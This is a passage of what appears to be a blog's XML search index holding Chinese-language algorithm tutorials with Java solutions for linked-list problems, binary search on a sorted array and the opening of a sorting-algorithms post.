keyword">return</span> null<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">merge</span><span class="token punctuation">(</span>lists<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> lists<span class="token punctuation">.</span>length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 链表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>单链表删除数字</title>
      <link href="/2018/12/27/suan-fa/lian-biao/dan-lian-biao-shan-chu-shu-zi/"/>
      <url>/2018/12/27/suan-fa/lian-biao/dan-lian-biao-shan-chu-shu-zi/</url>
      
        <content type="html"><![CDATA[<h2 id="单链表删除数字"><a href="#单链表删除数字" class="headerlink" title="单链表删除数字"></a>单链表删除数字</h2><p><strong>问题</strong></p><p>这个题目说的是，给你一个单链表和一个数字，你要删除节点上数字等于给定数字的那些节点，然后返回删除节点后的单链表。</p><pre class=" language-markdown"><code class="language-markdown">比如说，给你的单链表是：1 -> 2 -> 4 -> 1 -> 8 -> 1要删除的数字是 1。那么删除 1 后，你要返回的单链表是：2 -> 4 -> 8</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ListNode</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> val<span class="token punctuation">;</span>    ListNode next<span class="token punctuation">;</span>    <span class="token function">ListNode</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>      val <span class="token operator">=</span> x<span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n), Space: O(1)</span>  <span class="token keyword">public</span> ListNode <span class="token function">remove</span><span class="token punctuation">(</span>ListNode head<span class="token punctuation">,</span> <span class="token keyword">int</span> val<span class="token punctuation">)</span> <span class="token punctuation">{</span>    ListNode dummy <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ListNode</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    dummy<span class="token punctuation">.</span>next <span class="token operator">=</span> head<span class="token punctuation">;</span>    ListNode notEqual <span class="token operator">=</span> dummy<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>notEqual<span class="token punctuation">.</span>next <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>notEqual<span class="token punctuation">.</span>next<span class="token punctuation">.</span>val <span class="token operator">==</span> val<span class="token punctuation">)</span> notEqual<span class="token punctuation">.</span>next <span class="token operator">=</span> notEqual<span class="token punctuation">.</span>next<span class="token punctuation">.</span>next<span class="token punctuation">;</span>      <span class="token keyword">else</span> notEqual <span class="token operator">=</span> notEqual<span class="token punctuation">.</span>next<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> dummy<span class="token punctuation">.</span>next<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 链表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>链表的相交节点</title>
      <link href="/2018/12/26/suan-fa/lian-biao/lian-biao-de-xiang-jiao-jie-dian/"/>
      <url>/2018/12/26/suan-fa/lian-biao/lian-biao-de-xiang-jiao-jie-dian/</url>
      
        <content type="html"><![CDATA[<h2 id="链表的相交节点"><a href="#链表的相交节点" class="headerlink" title="链表的相交节点"></a>链表的相交节点</h2><p><strong>问题</strong></p><p>这个题目说的是，给你两个单链表，你要找到它们相交的第一个节点。如果两个链表没有相交，则返回空指针。假设链表无环，并且你不能改变它的原始结构。另外要求算法是线性时间复杂度，空间复杂度要求是 O(1)。</p><pre class=" language-markdown"><code class="language-markdown">比如说，两条链表分别是：A:     1 -> 2<span class="token code keyword">              \</span><span class="token code keyword">               6 -> 7 -> null</span><span class="token code keyword">              /</span>B: 3 -> 4 -> 5你要返回的是 6 这个节点。</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ListNode</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> val<span class="token punctuation">;</span>    ListNode next<span class="token punctuation">;</span>    <span class="token function">ListNode</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>      val <span class="token operator">=</span> x<span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(m+n), Space: O(1)</span>  <span class="token keyword">public</span> ListNode <span class="token function">getIntersectionNodeWithoutLen</span><span class="token punctuation">(</span>ListNode headA<span class="token punctuation">,</span> ListNode headB<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>headA <span class="token operator">==</span> null <span class="token operator">||</span> headB <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token keyword">return</span> null<span class="token punctuation">;</span>    ListNode p <span class="token operator">=</span> headA<span class="token punctuation">,</span> q <span class="token operator">=</span> headB<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>p <span class="token operator">!=</span> q<span class="token punctuation">)</span> <span class="token punctuation">{</span>      p <span class="token operator">=</span> p <span class="token operator">==</span> null <span class="token operator">?</span> headB <span class="token operator">:</span> p<span class="token punctuation">.</span>next<span class="token punctuation">;</span>      q <span class="token operator">=</span> q <span class="token operator">==</span> null <span class="token operator">?</span> headA <span class="token operator">:</span> q<span class="token punctuation">.</span>next<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> p<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(m+n), Space: O(1)</span>  <span class="token keyword">public</span> ListNode <span class="token function">getIntersectionNodeWithLen</span><span class="token punctuation">(</span>ListNode headA<span class="token punctuation">,</span> ListNode headB<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> lenA <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> lenB <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>ListNode p <span class="token operator">=</span> headA<span class="token punctuation">;</span> p <span class="token operator">!=</span> null<span class="token punctuation">;</span> p <span class="token operator">=</span> p<span class="token punctuation">.</span>next<span class="token punctuation">,</span> <span class="token operator">++</span>lenA<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>ListNode p <span class="token operator">=</span> headB<span class="token punctuation">;</span> p <span class="token operator">!=</span> null<span class="token punctuation">;</span> p <span class="token operator">=</span> p<span class="token punctuation">.</span>next<span class="token punctuation">,</span> <span class="token operator">++</span>lenB<span class="token punctuation">)</span><span class="token punctuation">;</span>    ListNode p <span class="token operator">=</span> headA<span class="token punctuation">,</span> q <span class="token operator">=</span> headB<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>lenA <span class="token operator">></span> lenB<span class="token punctuation">)</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> lenA <span class="token operator">-</span> lenB<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> p <span class="token operator">=</span> p<span class="token punctuation">.</span>next<span class="token punctuation">;</span>    <span class="token keyword">else</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> lenB <span class="token operator">-</span> lenA<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> q <span class="token operator">=</span> q<span class="token punctuation">.</span>next<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>p <span class="token operator">!=</span> q<span class="token punctuation">)</span> <span class="token punctuation">{</span>      p <span class="token operator">=</span> p<span class="token punctuation">.</span>next<span class="token punctuation">;</span>      q <span class="token operator">=</span> q<span class="token punctuation">.</span>next<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> p<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 链表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>判断单链表是否有环</title>
      <link href="/2018/12/26/suan-fa/lian-biao/pan-duan-dan-lian-biao-shi-fou-you-huan/"/>
      <url>/2018/12/26/suan-fa/lian-biao/pan-duan-dan-lian-biao-shi-fou-you-huan/</url>
      
        <content type="html"><![CDATA[<h2 id="判断单链表是否有环"><a href="#判断单链表是否有环" class="headerlink" title="判断单链表是否有环"></a>判断单链表是否有环</h2><p><strong>问题</strong></p><p>这个题目说的是，给你一个单链表，你要判断它是否会形成环，也就是链表的最后一个节点指向了前面一个已经存在的节点。</p><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ListNode</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> val<span class="token punctuation">;</span>    ListNode next<span class="token punctuation">;</span>    <span class="token function">ListNode</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>      val <span class="token operator">=</span> x<span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n), Space: O(n)</span>  <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">hasCycleWithHashSet</span><span class="token punctuation">(</span>ListNode head<span class="token punctuation">)</span> <span class="token punctuation">{</span>    Set<span class="token operator">&lt;</span>ListNode<span class="token operator">></span> set <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashSet</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>ListNode p <span class="token operator">=</span> head<span class="token punctuation">;</span> p <span class="token operator">!=</span> null<span class="token punctuation">;</span> p <span class="token operator">=</span> p<span class="token punctuation">.</span>next<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>set<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>      set<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(n), Space: O(1)</span>  <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">hasCycleWithTwoPointer</span><span class="token punctuation">(</span>ListNode head<span class="token punctuation">)</span> <span class="token punctuation">{</span>    ListNode fast <span class="token operator">=</span> head<span class="token punctuation">,</span> slow <span class="token operator">=</span> head<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>fast <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> fast<span class="token punctuation">.</span>next <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>      fast <span class="token operator">=</span> fast<span class="token punctuation">.</span>next<span class="token punctuation">.</span>next<span class="token punctuation">;</span>      slow <span class="token operator">=</span> slow<span class="token punctuation">.</span>next<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>fast <span class="token operator">==</span> slow<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 链表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>有序数组中查找数字的开始和结束下标</title>
      <link href="/2018/12/26/suan-fa/shu-zu/you-xu-shu-zu-zhong-cha-zhao-shu-zi-de-kai-shi-he-jie-shu-xia-biao/"/>
      <url>/2018/12/26/suan-fa/shu-zu/you-xu-shu-zu-zhong-cha-zhao-shu-zi-de-kai-shi-he-jie-shu-xia-biao/</url>
      
        <content type="html"><![CDATA[<h2 id="有序数组中查找数字的开始和结束下标"><a href="#有序数组中查找数字的开始和结束下标" class="headerlink" title="有序数组中查找数字的开始和结束下标"></a>有序数组中查找数字的开始和结束下标</h2><p><strong>问题</strong></p><p>这个题目说的是，给你一个<strong>递增排序</strong>的数组和一个目标值，你要找到目标值在这个数组中的开始下标和结束下标。如果找不到目标值，就返回 [-1, -1]。</p><pre class=" language-markdown"><code class="language-markdown">比如说，给你的递增数组是：1, 2, 2, 4, 4, 8, 8给你的目标值是 2。2 在这个数组中的开始下标是 1，结束下标是 2，于是你要返回：[1, 2]如果给你的目标值是 0，0 不在这个数组中，因此你要返回：[-1, -1]</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// Time: O(n), Space: O(1)</span>  <span class="token keyword">public</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">findFirstAndLastPosition</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> target<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>nums <span class="token operator">==</span> null <span class="token operator">||</span> nums<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span>length<span class="token punctuation">,</span> start <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> end <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> target<span class="token punctuation">)</span> <span class="token punctuation">{</span>        start <span class="token operator">=</span> i<span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token operator">--</span>j<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> target<span class="token punctuation">)</span> <span class="token punctuation">{</span>        end <span class="token operator">=</span> j<span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>start<span class="token punctuation">,</span> end<span class="token punctuation">}</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">private</span> <span class="token keyword">int</span> <span class="token function">binarySearchLastOne</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> target<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> low <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> high <span class="token operator">=</span> nums<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>low <span class="token operator">&lt;=</span> high<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">int</span> mid <span class="token operator">=</span> low <span class="token operator">+</span> <span class="token punctuation">(</span>high <span class="token operator">-</span> low<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>target <span class="token operator">&lt;</span> nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span> high <span class="token operator">=</span> mid <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>      <span class="token keyword">else</span> low <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> high<span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(log(n)), Space: O(1)</span>  <span class="token keyword">public</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">binarySearchFirstAndLastPosition</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> target<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>nums <span class="token operator">==</span> null <span class="token operator">||</span> nums<span class="token punctuation">.</span>length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> end <span class="token operator">=</span> <span class="token function">binarySearchLastOne</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> start <span class="token operator">=</span> <span class="token function">binarySearchLastOne</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> target<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>start <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> start <span class="token operator">&lt;=</span> end <span class="token operator">&amp;&amp;</span> end <span class="token operator">&lt;</span> nums<span class="token punctuation">.</span>length<span class="token punctuation">)</span>      <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>start<span class="token punctuation">,</span> end<span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 数组 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>求两个单链表之和</title>
      <link href="/2018/12/26/suan-fa/lian-biao/qiu-liang-ge-dan-lian-biao-zhi-he/"/>
      <url>/2018/12/26/suan-fa/lian-biao/qiu-liang-ge-dan-lian-biao-zhi-he/</url>
      
        <content type="html"><![CDATA[<h2 id="求两个单链表之和"><a href="#求两个单链表之和" class="headerlink" title="求两个单链表之和"></a>求两个单链表之和</h2><p><strong>问题</strong></p><p>这个题目说的是，给你两个非空的单链表，它们代表两个非负整数，并且逆序表示。你要将这两个数求和，并将结果以链表形式返回。你不需要考虑前导 0 这种情况，也就说 3 不会表示成 003 这样子。</p><pre class=" language-markdown"><code class="language-markdown">比如说给你的两个链接表是：1 -> 2 -> 36 -> 7 -> 8 -> 91 -> 2 -> 3 表示的整数是 321，6 -> 7 -> 8 -> 9 表示的整数是 9876。我们需要输出的是它们求和后的链表：7 -> 9 -> 1 -> 0 -> 1</code></pre><p><strong>代码</strong></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AlgoCasts</span> <span class="token punctuation">{</span>  <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ListNode</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> val<span class="token punctuation">;</span>    ListNode next<span class="token punctuation">;</span>    <span class="token function">ListNode</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span> <span class="token punctuation">{</span>      val <span class="token operator">=</span> x<span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">// Time: O(max(m, n)), Space: O(max(m, n))</span>  <span class="token keyword">public</span> ListNode <span class="token function">addTwoLinkedListNumbers</span><span class="token punctuation">(</span>ListNode l1<span class="token punctuation">,</span> ListNode l2<span class="token punctuation">)</span> <span class="token punctuation">{</span>    ListNode dummy <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ListNode</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> p <span class="token operator">=</span> dummy<span class="token punctuation">;</span>    <span class="token keyword">int</span> carry <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>l1 <span class="token operator">!=</span> null <span class="token operator">||</span> l2 <span class="token operator">!=</span> null <span class="token operator">||</span> carry <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">int</span> sum <span class="token operator">=</span> carry<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>l1 <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>        sum <span class="token operator">+=</span> l1<span class="token punctuation">.</span>val<span class="token punctuation">;</span>        l1 <span class="token operator">=</span> l1<span class="token punctuation">.</span>next<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>l2 <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>        sum <span class="token operator">+=</span> l2<span class="token punctuation">.</span>val<span class="token punctuation">;</span>        l2 <span class="token operator">=</span> l2<span class="token punctuation">.</span>next<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      p<span class="token punctuation">.</span>next <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ListNode</span><span class="token punctuation">(</span>sum <span class="token operator">%</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      p <span class="token operator">=</span> p<span class="token punctuation">.</span>next<span class="token punctuation">;</span>      carry <span class="token operator">=</span> sum <span class="token operator">/</span> <span class="token number">10</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> dummy<span class="token punctuation">.</span>next<span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 链表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>排序算法</title>
      <link href="/2018/12/26/suan-fa/pai-xu/pai-xu-suan-fa/"/>
      <url>/2018/12/26/suan-fa/pai-xu/pai-xu-suan-fa/</url>
      
        <content type="html"><![CDATA[<h2 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h2><p>待排序的元素需要实现 Java 的 Comparable 接口，该接口有 compareTo() 方法，可以用它来判断两个元素的大小关系。</p><p>研究排序算法的成本模型时，计算的是比较和交换的次数。</p><p>使用辅助函数 less() 和 swap() 来进行比较和交换的操作，使得代码的可读性和可移植性更好。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Sort</span><span class="token operator">&lt;</span>T <span class="token keyword">extends</span> <span class="token class-name">Comparable</span><span class="token operator">&lt;</span>T<span class="token operator">>></span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">void</span> <span class="token function">sort</span><span class="token punctuation">(</span>T<span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token keyword">boolean</span> <span class="token function">less</span><span class="token punctuation">(</span>T v<span class="token punctuation">,</span> T w<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> v<span class="token punctuation">.</span><span class="token function">compareTo</span><span class="token punctuation">(</span>w<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">swap</span><span class="token punctuation">(</span>T<span class="token punctuation">[</span><span class="token punctuation">]</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> i<span class="token punctuation">,</span> <span class="token keyword">int</span> j<span class="token punctuation">)</span> <span class="token punctuation">{</span>        T t <span class="token operator">=</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        a<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> a<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>        a<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> t<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="选择排序"><a href="#选择排序" class="headerlink" title="选择排序"></a>选择排序</h2><p>选择出数组中的最小元素，将它与数组的第一个元素交换位置。再从剩下的元素中选择出最小的元素，将它与数组的第二个元素交换位置。不断进行这样的操作，直到将整个数组排序。</p><p>选择排序需要 ~N2/2 次比较和 ~N 次交换，它的运行时间与输入无关，这个特点使得它对一个已经排序的数组也需要这么多的比较和交换操作。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/37e79a32-95a9-4503-bdb1-159527e628b8.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/37e79a32-95a9-4503-bdb1-159527e628b8.png" alt="img"></a></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Selection</span><span class="token operator">&lt;</span>T <span class="token keyword">extends</span> <span class="token class-name">Comparable</span><span class="token operator">&lt;</span>T<span class="token operator">>></span> <span class="token keyword">extends</span> <span class="token class-name">Sort</span><span class="token operator">&lt;</span>T<span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">sort</span><span class="token punctuation">(</span>T<span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> N <span class="token operator">=</span> nums<span class="token punctuation">.</span>length<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> N <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i<span class="token 